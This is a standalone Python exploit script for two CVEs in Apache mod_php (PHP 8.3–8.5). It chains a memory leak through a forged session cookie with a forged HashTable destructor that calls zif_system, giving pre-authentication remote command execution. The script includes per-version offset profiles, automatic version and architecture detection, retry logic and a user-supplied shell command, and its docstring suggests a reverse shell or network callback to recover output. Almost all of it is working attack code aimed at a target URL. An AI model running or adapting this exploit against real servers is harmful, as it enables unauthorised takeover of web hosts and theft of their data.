#!/usr/bin/env python3
"""Standalone pure-HTTP PoC for CVE-2026-109618 + CVE-2026-109619 on
Apache mod_php (PHP 8.5.x vulnerable builds, stock defaults).

Chain (one keep-alive connection = one prefork child):
  A_leak  startup OOM with upload-progress + 1001 cookies -> stale session id
  B_leak  forged value strings -> Set-Cookie OOB window -> chunk + libphp base
  A2      startup OOM -> stale filter extension array survives
  B2      partial bucket in $_POST -> zend_array_destroy(hold)
          -> pDestructor = zif_system -> system(cmd)

Build-specific constants (all offsets, never addresses):
  --zdtor-off   zval_ptr_dtor offset in libphp.so   (8.5.11: 0x761B80)
  --zif-off     zif_system    offset in libphp.so   (8.5.11: 0x5314F0)
  --hold-off    hold carrier offset inside the 2 MiB chunk (8.5.11/8.4.26: 0x69398)

Get the two symbol offsets from the target image, e.g.:
  nm /usr/lib/apache2/modules/libphp.so | grep -E ' (zif_system|zval_ptr_dtor)$'
The hold offset is calibrated once per build+payload shape.

The command is run by zif_system() via /bin/sh -c as the web user. Its stdout
does not come back in the HTTP response, use a file, a network callback, or
a reverse shell. The child that serves the request aborts right after the
command runs. Max command length: 231 bytes, no NUL byte.
"""
import argparse
import re
import socket
import struct
import sys
import urllib.parse

LEAK_BOUND = b"----leak25"
FILES_BOUND = b"----files618"
ZDTOR_OFF = 0x761B80
ZIF_OFF = 0x5314F0
HOLD_OFF = 0x69398
PROFILES = {
    # ---- arm64 (aarch64) ----
    "8.5.11-arm64": dict(zif=0x5314F0, zdtor=0x761B80, lib_align=0x200000,
                         hold=0x69398, vals=24, size=9216, flood=600),
    "8.3.35-arm64": dict(zif=0x377428, zdtor=0x46FCC0, lib_align=0x10000,
                         hold=0x6A398, vals=24, size=9216, flood=600),
    "8.4.26-arm64": dict(zif=0x42CD70, zdtor=0x638120, lib_align=0x10000,
                         hold=0x69398, vals=24, size=9216, flood=600),
    "8.5.4-arm64": dict(zif=0x5021D0, zdtor=0x731060, lib_align=0x200000,
                        hold=0x69398, vals=64, size=16384, flood=600),
    # ---- amd64 (x86_64) ----
    "8.5.11-amd64": dict(zif=0x5996E0, zdtor=0x7B47A0, lib_align=0x200000,
                         hold=0x69398, vals=24, size=9216, flood=600),
    "8.4.26-amd64": dict(zif=0x465370, zdtor=0x65EB60, lib_align=0x1000,
                         hold=0x69398, vals=24, size=9216, flood=600),
    "8.5.4-amd64": dict(zif=0x5705E0, zdtor=0x788BA0, lib_align=0x200000,
                        hold=0x69398, vals=64, size=16384, flood=600),
    "8.3.35-amd64": dict(zif=0x3AC080, zdtor=0x49EC50, lib_align=0x1000,
                         hold=0x6A398, vals=24, size=9216, flood=600),
}
# short aliases (arch-specific entries win for --auto)
PROFILES.update({
    "8.5.11": PROFILES["8.5.11-arm64"],
    "8.4.26": PROFILES["8.4.26-arm64"],
    "8.5.4": PROFILES["8.5.4-arm64"],
})

# Known non-working source paths (auto mode reports them instead of spinning).
BLOCKED = {
    "8.2.34": "vulnerable, but php_session_reset_id() zeroes send_cookie even "
              "when the cookie send fails (8.2.x), so the pre-auth consumer never "
              "emits the forged cookie. Needs the OOM-inside-send_cookie arm.",
    "8.2.35": "PATCHED release (first fixed 8.2 build, advisory 2026-10-21). "
              "The chain is expected to fail here; use it as a negative control.",
}

CHUNK_MASK = 0x1FFFFF
PTR_LO = 0x400000000000          # 48-bit user pointers (0x0000ffff...)
PTR_HI = 0x0000FFFFFFFFFFF0
COMMAND_MAX = 0xE7  # carrier 0x180, command at 0x98, NUL-terminated


# ---------------------------------------------------------------- primitives
def p32(v):
    return struct.pack("<I", v & 0xFFFFFFFF)


def p64(v):
    return struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)


def carrier(address, zif_system, command):
    """384-byte fake HashTable / execute_data / zend_string (8.x layout)."""
    if b"\x00" in command:
        raise ValueError("command cannot contain NUL")
    if len(command) > COMMAND_MAX:
        raise ValueError("command is %d bytes; max is %d" % (len(command), COMMAND_MAX))
    d = bytearray(0x180)
    d[0:4] = p32(1)
    d[4:8] = p32(7)                     # gc refcount, IS_ARRAY
    d[8:12] = p32(0x10)
    d[12:16] = p32(0xFFFFFFF8)          # flags, mask
    d[0x10:0x18] = p64(address + 0x20)  # arData -> bucket
    d[0x18:0x1C] = p32(1)
    d[0x1C:0x20] = p32(1)               # used, elements
    d[0x20:0x24] = p32(8)               # overwritten by the fake opline below
    d[0x30:0x38] = p64(zif_system)      # pDestructor / return_value
    d[0x20:0x28] = p64(0)               # fake execute_data: opline
    d[0x4C:0x50] = p32(1)               # num_args
    d[0x70:0x78] = p64(address + 0x80)  # arg1 -> zend_string
    d[0x78:0x7C] = p32(6)               # IS_STRING
    d[0x80:0x84] = p32(1)
    d[0x84:0x88] = p32(0x106)           # zend_string gc
    d[0x90:0x98] = p64(len(command))
    d[0x98:0x98 + len(command)] = command
    return bytes(d)


def primer_multi(fake_ptr, offsets=(72, 104, 136, 168), size=276):
    """Primer value: fake zval {fake_ptr, IS_ARRAY_EX} at every bucket slot a
    partial bucket may land on; keys at 64+32i are zeroed."""
    buf = bytearray(size)
    buf[0:4] = b"PRM1"
    for off in offsets:
        buf[off:off + 8] = p64(fake_ptr)
        buf[off + 8:off + 12] = p32(0x307)
    for i in (1, 2, 3, 4, 5):
        k = 64 + 32 * i
        if k + 8 <= size:
            buf[k:k + 8] = p64(0)
    return bytes(buf)


def part(bound, name, value=b"", filename=None):
    d = b'Content-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        d += b'; filename="' + filename + b'"'
    return (b"--" + bound + b"\r\n" + d + b"\r\n\r\n" + value + b"\r\n")


def end(bound):
    return b"--" + bound + b"--\r\n"


# ------------------------------------------------------------- request shapes
def leak_arm():
    parts = [part(LEAK_BOUND, b"PHPSESSID", b"\x00"),
             part(LEAK_BOUND, b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
             part(LEAK_BOUND, b"f", b"A" * 64, b"a.txt")]
    for i in range(1000):
        parts.append(part(LEAK_BOUND, b"f%d" % i + b"[a]" * 63, b"", b""))
    return b"".join(parts) + end(LEAK_BOUND)


def forge_value(size=9216, forged_len=0xC0000):
    unit = b"e" * 8 + p64(forged_len)
    return (unit * (size // 16 + 1))[:size]


def leak_consume(vals=24, size=9216, flood=600, forged_len=0xC0000):
    parts = [part(LEAK_BOUND, b"v%d" % i, forge_value(size, forged_len))
             for i in range(vals)]
    for i in range(flood):
        parts.append(part(LEAK_BOUND, b"q%d[a][b][c][d]" % i, b"h"))
    parts.append(part(LEAK_BOUND, b"PHPSESSID", b"cafebabecafebabecafebabecafebabe"))
    parts.append(part(LEAK_BOUND, b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn"))
    return b"".join(parts) + end(LEAK_BOUND)


def a2_body():
    parts = [part(FILES_BOUND, b"", primer_multi(0)),
             part(FILES_BOUND, b"a", b"1")]
    for i in range(950):
        parts.append(part(FILES_BOUND, b"f[k%d]" % i + b"[a]" * 58, b"", b""))
    parts.append(part(FILES_BOUND, b"V" * 32000 + b"[x]", b"1"))
    return b"".join(parts) + end(FILES_BOUND)


def b2_body(hold_ptr, hold_bytes):
    parts = [part(FILES_BOUND, b"", primer_multi(hold_ptr)),
             part(FILES_BOUND, b"a", b"1"),
             part(FILES_BOUND, b"hold", hold_bytes)]
    for i in range(925):
        parts.append(part(FILES_BOUND, b"f[k%d]" % i + b"[a]" * 58, b"", b""))
    for i in range(2):
        parts.append(part(FILES_BOUND, b"d%d_" % i + b"D" * 8192, b"", b""))
    parts.append(part(FILES_BOUND, b"V" * 200000 + b"[x]", b"1"))
    return b"".join(parts) + end(FILES_BOUND)


# ------------------------------------------------------------------- transport
class Client:
    def __init__(self, host, port, path, timeout):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.path = path
        self.host = host

    def send(self, body, boundary, cookies=None):
        extra = b"Cookie: " + cookies + b"\r\n" if cookies else b""
        head = (b"POST " + self.path + b" HTTP/1.1\r\nHost: " + self.host.encode() +
                b"\r\n" + extra + b"Content-Type: multipart/form-data; boundary=" +
                boundary + b"\r\nContent-Length: " + str(len(body)).encode() +
                b"\r\nConnection: keep-alive\r\n\r\n")
        self.s.sendall(head + body)
        out = b""
        while b"\r\n\r\n" not in out:
            c = self.s.recv(65536)
            if not c:
                return out, b""
            out += c
        hdr, rest = out.split(b"\r\n\r\n", 1)
        low = hdr.lower()
        if b"transfer-encoding: chunked" in low:
            buf = rest
            body = b""
            while True:
                while b"\r\n" not in buf:
                    c = self.s.recv(65536)
                    if not c:
                        return hdr, body
                    buf += c
                line, buf = buf.split(b"\r\n", 1)
                try:
                    n = int(line.split(b";")[0], 16)
                except ValueError:
                    return hdr, body + buf
                if n == 0:
                    return hdr, body
                while len(buf) < n + 2:
                    c = self.s.recv(65536)
                    if not c:
                        return hdr, body + buf[:n]
                    buf += c
                body += buf[:n]
                buf = buf[n + 2:]
        clen = 0
        for line in hdr.split(b"\r\n")[1:]:
            if line.lower().startswith(b"content-length:"):
                clen = int(line.split(b":")[1].strip())
        while len(rest) < clen:
            c = self.s.recv(65536)
            if not c:
                break
            rest += c
        return hdr, rest[:clen]

    def close(self):
        try:
            self.s.close()
        except OSError:
            pass


def decode_cookie(hdr):
    m = re.search(rb"(?i)set-cookie:\s*PHPSESSID=([^\r;]+)", hdr or b"")
    if not m:
        return b""
    return urllib.parse.unquote_to_bytes(
        m.group(1).decode("latin-1").replace("+", "%20"))


# ---------------------------------------------------------------------- leak
def parse_window(win, zdtor_off, lib_align=None, leak_len=0xC0000):
    """Return (chunk_base, libphp_base, chunk_hits, lib_hits).

    Architecture-agnostic:
      - drops qwords produced by our own forged-value tiling (the only source
        of fake 2 MiB bases);
      - accepts any plausible 64-bit user pointer (x86_64 0x7f..., arm64
        0xffff..., etc.);
      - picks the libphp base by hit count, trying page-size alignments
        (2 MiB / 1 MiB / 64 KiB / 4 KiB).
    """
    # Our tiling unit is e*8 | p64(forged_len); every byte offset yields one of
    # 16 periodic qwords.  Skip them so the tiling cannot fake a chunk base.
    unit = b"e" * 8 + struct.pack("<Q", leak_len)
    period = unit * 2
    fakes = {int.from_bytes((period * 2)[p:p + 8], "little") for p in range(16)}
    ptrs = []
    for i in range(0, len(win) - 7):
        q = struct.unpack_from("<Q", win, i)[0]
        if q in fakes:
            continue
        if 0x400000000000 <= q <= 0x0000FFFFFFFFFFFF:
            ptrs.append(q)
    chunks = {}
    for q in ptrs:
        b = q & ~CHUNK_MASK
        if b and b % 0x200000 == 0 and b >= 0x400000000000:
            chunks[b] = chunks.get(b, 0) + 1
    chunk = max(chunks.items(), key=lambda kv: kv[1])[0] if chunks else None

    libs = {}
    aligns = (lib_align,) if lib_align else (0x200000, 0x100000, 0x10000, 0x1000)
    for align in aligns:
        for q in ptrs:
            b = q - zdtor_off
            if b > 0 and b % align == 0 and b >= 0x400000000000:
                libs[b] = libs.get(b, 0) + 1
    lib = max(libs.items(), key=lambda kv: kv[1])[0] if libs else None
    return chunk, lib, (max(chunks.values()) if chunks else 0), \
        (max(libs.values()) if libs else 0)


# ---------------------------------------------------------------------- main
def powered_by(hdr):
    m = re.search(rb"(?im)^x-powered-by:\s*PHP/(\d+\.\d+\.\d+)", hdr or b"")
    return m.group(1).decode() if m else None


def pick_profile(version, arch):
    return PROFILES.get("%s-%s" % (version, arch))


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", required=True, help="e.g. http://127.0.0.1:8080/index.php")
    ap.add_argument("--cmd", default="id", help="shell command (<=231 bytes, no NUL)")
    ap.add_argument("--auto", action="store_true",
                    help="detect PHP version (X-Powered-By) and arch (leaked pointers), "
                         "select the bundled profile, then fire")
    ap.add_argument("--version", default=None, help="override auto-detected version")
    ap.add_argument("--force", action="store_true",
                    help="ignore the known-blocked/patch warning and try anyway")
    ap.add_argument("--zdtor-off", type=lambda x: int(x, 0), default=ZDTOR_OFF)
    ap.add_argument("--zif-off", type=lambda x: int(x, 0), default=ZIF_OFF)
    ap.add_argument("--hold-off", type=lambda x: int(x, 0), default=HOLD_OFF)
    ap.add_argument("--lib-align", type=lambda x: int(x, 0), default=None,
                    help="libphp load-base alignment (default: profile / auto)")
    ap.add_argument("--profile", choices=sorted(PROFILES), default=None,
                    help="per-build defaults: symbol offsets, alignment, hold, leak shape")
    ap.add_argument("--leak-vals", type=int, default=24)
    ap.add_argument("--leak-size", type=int, default=9216)
    ap.add_argument("--leak-flood", type=int, default=600)
    ap.add_argument("--leak-len", type=lambda x: int(x, 0), default=0xC0000,
                    help="forged id length / window size (0xC0000, 0x180000)")
    ap.add_argument("--attempts", type=int, default=1,
                    help="whole-chain attempts (each on a fresh connection/child)")
    ap.add_argument("--timeout", type=float, default=240)
    args = ap.parse_args()

    if args.profile:
        prof = PROFILES[args.profile]
        if args.zif_off == ZIF_OFF:
            args.zif_off = prof["zif"]
        if args.zdtor_off == ZDTOR_OFF:
            args.zdtor_off = prof["zdtor"]
        if args.hold_off == HOLD_OFF:
            args.hold_off = prof["hold"]
        args.lib_align = args.lib_align or prof["lib_align"]
        if args.leak_vals == 24 and args.leak_size == 9216:
            args.leak_vals, args.leak_size = prof["vals"], prof["size"]
        if args.leak_flood == 600:
            args.leak_flood = prof["flood"]

    command = args.cmd.encode()
    u = urllib.parse.urlsplit(args.url)
    host = u.hostname
    port = u.port or (443 if u.scheme == "https" else 80)
    path = (u.path or "/").encode() + (b"?" + u.query.encode() if u.query else b"")
    if u.scheme == "https":
        print("[!] TLS is not implemented; use an HTTP front end", file=sys.stderr)
        return 2
    cookies = b"; ".join(b"a%d=1" % i for i in range(1001))

    last = "no attempt"
    for attempt in range(1, args.attempts + 1):
        print("[*] attempt %d: connecting to %s:%d%s" % (attempt, host, port, path.decode()))
        c = Client(host, port, path, args.timeout)
        try:
            hdr, body = c.send(leak_arm(), LEAK_BOUND, cookies)
            print("    A_leak  %s (%d bytes)" % (hdr.split(b"\r\n", 1)[0].decode("latin-1", "replace"), len(body)))
            version = args.version or powered_by(hdr)
            if version in BLOCKED and not args.force:
                print("[!] %s is not reachable with this leak: %s" % (version, BLOCKED[version]))
                return 3

            # Leak shape: bundled profile for this version, else CLI/rotation.
            shape = None
            if args.profile:
                shape = PROFILES[args.profile]
            elif version:
                shape = pick_profile(version, "arm64") or pick_profile(version, "amd64")
            if shape is None and args.auto:
                print("[!] no bundled profile for version=%s; run scripts/image_offsets.sh on "
                      "the target image and pass --zif-off/--zdtor-off/--lib-align" % version)
                return 3

            vals = args.leak_vals if shape is None else shape["vals"]
            size = args.leak_size if shape is None else shape["size"]
            flood = args.leak_flood if shape is None else shape["flood"]
            # Placement is build-specific: rotate shape/window across attempts.
            variants = [
                (vals, size, args.leak_len),
                (vals, size, 0x180000),
                (max(vals, 64), max(size, 16384), args.leak_len),
                (max(vals, 64), max(size, 16384), 0x180000),
            ]
            vals, size, flen = variants[(attempt - 1) % len(variants)]
            print("    leak    version=%s vals=%d size=%d window=%#x" % (version, vals, size, flen))
            hdr, body = c.send(leak_consume(vals, size, flood, flen), LEAK_BOUND)
            print("    B_leak  %s (%d bytes)" % (hdr.split(b"\r\n", 1)[0].decode("latin-1", "replace"), len(body)))
            win = decode_cookie(hdr)

            # Chunk base is offset-independent; it also reveals the arch.
            chunk, _, hits, _ = parse_window(win, 1, 0x1000, flen)
            arch = "arm64" if chunk and chunk >= 0x800000000000 else "amd64"
            if chunk:
                print("    chunk   %#x (%d hits, %s)" % (chunk, hits, arch))
            if not chunk:
                last = "leak incomplete (no chunk base)"
                print("[!] %s; retrying" % last)
                continue

            prof = PROFILES.get(args.profile) if args.profile else pick_profile(version, arch)
            if prof is None:
                print("[!] no profile for PHP %s / %s. Extract it with:" % (version, arch))
                print("      scripts/image_offsets.sh <container>")
                print("    then run with --zif-off <zif> --zdtor-off <zdtor> "
                      "--lib-align <align> --hold-off %#x" % HOLD_OFF)
                return 3
            if args.auto and prof is not shape and shape is not None:
                pass  # per-arch profile supersedes the shape hint
            zdtor = args.zdtor_off if args.zif_off != ZIF_OFF else prof["zdtor"]
            align = args.lib_align or prof["lib_align"]
            zif_off = args.zif_off if args.zif_off != ZIF_OFF else prof["zif"]
            hold_off = args.hold_off if args.hold_off != HOLD_OFF else prof["hold"]

            _, lib, _, lhits = parse_window(win, zdtor, align, flen)
            print("    window  %d bytes, libphp=%s (%d hits)" %
                  (len(win), hex(lib) if lib else "None", lhits))
            if not lib:
                last = "leak incomplete (chunk yes, libphp no)"
                print("[!] %s; retrying" % last)
                continue

            zif = lib + zif_off
            hold = chunk + hold_off
            print("    bases   chunk=%#x libphp=%#x zif_system=%#x" % (chunk, lib, zif))
            print("    hold    %#x (chunk+%#x)" % (hold, hold_off))

            hdr, body = c.send(a2_body(), FILES_BOUND)
            print("    A2      %s (%d bytes)" % (hdr.split(b"\r\n", 1)[0].decode("latin-1", "replace"), len(body)))

            forged = carrier(hold, zif, command)
            hdr, body = c.send(b2_body(hold, forged), FILES_BOUND)
            print("    B2      %s (%d bytes)" % (hdr.split(b"\r\n", 1)[0].decode("latin-1", "replace"), len(body)))
            print("[+] dispatched: %r" % args.cmd)
            print("    stdout does not return; the child serving the request exits after the command.")
            return 0
        except OSError as e:
            last = "transport: %s" % e
            print("[!] %s" % last)
        finally:
            c.close()
    print("[-] failed: %s" % last)
    return 1


if __name__ == "__main__":
    sys.exit(main())
